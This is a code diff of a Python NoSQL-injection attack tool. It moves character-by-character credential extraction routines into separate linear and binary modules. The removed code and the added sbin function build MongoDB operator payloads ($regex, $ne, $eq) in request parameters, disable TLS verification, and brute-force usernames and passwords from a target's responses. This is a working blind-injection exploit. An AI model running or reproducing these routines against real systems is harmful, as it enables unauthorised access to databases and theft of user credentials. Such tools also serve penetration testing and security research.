@@ -7,6 +7,8 @@ import string
 from requests_html import HTMLSession
 from termcolor import colored
 import time
+import algos.linear as linear
+import algos.binary as binary
 
 try:
     from BeautifulSoup import BeautifulSoup
@@ -130,178 +132,29 @@ def slinear(nsi):
             form_data[element + "[$ne]"] = "."
 
     if nsi.typeParam == "2":  # known value
-        dumpKnownValue(nsi, form_data, password)
+        linear.dumpKnownValue(nsi, form_data, password)
     else:  # unknown value (dump usernames or passwords)
-        getPrefix(nsi, form_data)
-
-
-def getPrefix(nsi, form_data):
-    prefixUsernames = []
-    alphabet = list(string.ascii_letters) + list(string.digits)
-    start_time = time.time()
-    total_time = 0
-    timesPrefix = []
-    
-    for c in alphabet:
-        # for element in form_data:
-        #     if "$regex" in element:
-        #         form_data[element] = "^" + str(c) + ".*"
-        iterateParam(form_data, "^" + str(c) + ".*")
-        r = requests.post(nsi.url, data=form_data, verify=False)
-        if nsi.successIdentifier in r.text:
-            end_time = time.time()
-            time_taken = end_time - start_time
-            total_time += time_taken
-            prefixUsernames.append(c)
-            timesPrefix.append({
-                c: time_taken
-            })
-            print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
-
-    print(colored(f"Total time get username prefixes: {total_time}", "yellow", attrs=["blink"]))
-    print(timesPrefix)
-    for username in prefixUsernames:
-        dumpData(nsi, username, form_data)
-
-
-# recursive
-def dumpData(nsi, username, form_data, total_time = 0):
-    alphabet = list(string.ascii_letters) + list(string.digits)
-    updated_form_data = {}
-    start_time = time.time()
-
-    for element in form_data:
-        if "$regex" in element:
-            element = element.replace("[$regex]", "")
-            updated_form_data[element] = username
-        else:
-            updated_form_data[element] = form_data[element]
-        r = requests.post(nsi.url, data=updated_form_data, verify=False)
-        if nsi.successIdentifier in r.text:
-            print(f"Result: {username} | Total Time: {total_time}")
-            # start_time = time.time()
-            # total_time = 0
-    
-    while True:
-        for c in alphabet:
-            iterateParam(form_data, "^" + str(username + c) + ".*")
-            # print("TRIGERRED" + username)
-            r = requests.post(nsi.url, data=form_data, verify=False)
-
-            if nsi.successIdentifier in r.text:
-                end_time = time.time()
-                time_taken = end_time - start_time
-                total_time += time_taken
-                dumpData(nsi, username + c, form_data, total_time)
-
-                print(colored(f"Time taken for append {c}: {time_taken}", "yellow", attrs=["blink"]))
-                start_time = time.time()
-                total_time = 0
-                
-            if c == alphabet[-1]:
-                return
-
-def iterateParam(form_data, val):
-    for element in form_data:
-            if "$regex" in element:
-                form_data[element] = val
-
-def dumpKnownValue(nsi, form_data, password):
-    start_time_length = time.time()
-    total_time_length = 0
-    # count length
-    for c in range(0, 9999999):
-        # for element in form_data:
-        #     if "$regex" in element:
-        #         form_data[element] = "^.{" + str(c) + "}$"
-        iterateParam(form_data, "^.{" + str(c) + "}$")
-        # r = requests.post(nsi.url, data=form_data, verify=False)
-        if (nsi.reqMethod == '2'):
-            r = requests.post(nsi.url, data=form_data, verify=False)
-        else:
-            r = requests.get(nsi.url, params=form_data, verify=False)
-
-        if nsi.successIdentifier in r.text:
-            end_time = time.time()
-            time_taken = end_time - start_time_length
-            print("Found length : %s" % (c))
-            length = c
-            total_time_length += time_taken
-            break
-    print(colored(f"Time taken length for {length}: {total_time_length}", "yellow", attrs=["blink"]))
-
-    start_time_char = time.time()
-    total_time_char = 0
-    for x in range(length):
-        for c in string.printable:
-            if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " "]:
-                # form_data = {}
-                # for element in form_data:
-                #     if "$regex" in element:
-                #         form_data[element] = f"^{urllib.parse.quote_plus(password+c)}"
-                iterateParam(form_data, f"^{urllib.parse.quote_plus(password+c)}")
-                if (nsi.reqMethod == '2'):
-                    r = requests.post(nsi.url, data=form_data, verify=False)
-                else:
-                    r = requests.get(nsi.url, params=form_data, verify=False)
-
-                if nsi.successIdentifier in r.text:
-                    end_time = time.time()
-                    time_taken = end_time - start_time_char
-                    print("Result : %s" % (password + c), end="\r")
-                    password += c
-                    print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
-                    total_time_char += time_taken
-                    start_time_char = time.time()
-                    break
-    print("Result : %s" % (password))
-
-
-# def slinearGet(nsi):
-#     username = "admin"
-#     password = ""
-#     length = ""
-
-#     # count length
-#     for c in range(0, 9999999):
-#         form_data = {}
-#         for element in nsi.params:
-#             if "*" in element:
-#                 element = element.replace("*", "")
-#                 form_data[element + "[$regex]"] = "^.{" + str(c) + "}$"
-#             else:
-#                 form_data[element + "[$eq]"] = username
-#         reqData = Str.http_build_query(form_data)
-#         r = requests.get(nsi.url + "?" + reqData, verify=False)
-
-#         if nsi.successIdentifier in r.text:
-#             print("Found length : %s" % (c))
-#             length = c
-#             break
-
-#     for x in range(length):
-#         for c in string.printable:
-#             if c not in ["*","+",".","?","|","'",'"',"&"," ","(",")","[","]","\\"]:
-#                 form_data = {}
-#                 for element in nsi.params:
-#                     if "*" in element:
-#                         element = element.replace("*", "")
-#                         form_data[element + "[$regex]"] = f"^{urllib.parse.quote_plus(password+c)}"
-#                     else:
-#                         form_data[element + "[$eq]"] = username
-#                 reqData = Str.http_build_query(form_data)
-#                 # print(reqData)
-#                 r = requests.get(nsi.url + "?" + reqData, verify=False)
-
-#                 if nsi.successIdentifier in r.text:
-#                     print("Result : %s" % (password + c), end="\r")
-#                     password += c
-#                     break
-#     print("Result : %s" % (password))
+        linear.getPrefix(nsi, form_data)
 
 
 def sbin(nsi):
-    return 0
+    password = ""
+    form_data = {}
+
+    for element in nsi.params:
+        if "*" in element:
+            element = element.replace("*", "")
+            form_data[element + "[$regex]"] = ""
+        elif ":" in element:
+            element = element.split(":")
+            form_data[element[0] + "[$eq]"] = element[1]
+        else:
+            form_data[element + "[$ne]"] = "."
+
+    if nsi.typeParam == "2":  # known value
+        binary.dumpKnownValue(nsi, form_data, password)
+    else:  # unknown value (dump usernames or passwords)
+        binary.getPrefix(nsi, form_data)
 
 
 def getResponseBodyHandlingErrors(req):
@@ -311,7 +164,6 @@ def getResponseBodyHandlingErrors(req):
         responseBody = err.read()
 
     return responseBody
-
 
 def checkWeb(url):
     print("Checking to see if site at " + str(url).strip() + " is up...")
